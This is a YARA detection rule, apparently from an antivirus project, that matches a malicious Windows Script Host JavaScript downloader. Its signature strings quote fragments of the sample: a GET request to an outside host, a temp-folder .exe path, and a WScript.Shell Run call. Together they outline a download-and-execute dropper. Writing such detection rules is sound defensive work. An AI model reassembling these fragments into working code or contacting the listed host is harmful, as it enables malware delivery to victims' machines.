rule sig_20160329_6ef0c5f744ffaf89dddd374e8a1ef6fa {
  meta:
    description = "datamaliciousorder - file 20160329_6ef0c5f744ffaf89dddd374e8a1ef6fa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fb4c1b945fe9100ff6146a33f918df67b3fedfc19c1e544656631967d431e25e"

  strings:
    $s1  = "e0[pl](\"GET\", \"http://dealingdeuces.com/o4pskd\", false);" fullword ascii
    $s2  = "function p() {return Uj[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"SmHpDHN4Ka.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[c](k0() * 11); if (e0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var Uj = function w() {return WScript[gz](\"WScript.Shell\");}(), N = 11;" fullword ascii
    $s5  = "function FS(t, Ax){a = a * 1; return t - Ax;};" fullword ascii
    $s6  = "function b(){return \"\" + e;};" fullword ascii
    $s7  = "function OS(A){Uj[\"Run\"](A, a, a);};" fullword ascii
    $s8  = "function gH() {return ((Pr == true) && (Pr == kC)) ? 1 : a;};" fullword ascii
    $s9  = "function k(jv) {var uz = (1, 2, 3, 4, 5, jv); return uz;};" fullword ascii
    $s10 = "return FS(m, A0);" fullword ascii
    $s11 = "var U = new this[\"Date\"]();" fullword ascii
    $s12 = "function k0(){return 22;};" fullword ascii
    $s13 = "function XE(){return gz;};" fullword ascii
    $s14 = "function ZV()" fullword ascii
    $s15 = " while (v){" fullword ascii
    $s16 = "var y = false;" fullword ascii
    $s17 = "Pr = true; " fullword ascii
    $s18 = "var Pr = false;" fullword ascii
    $s19 = "var kC = false;" fullword ascii
    $s20 = "kC = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}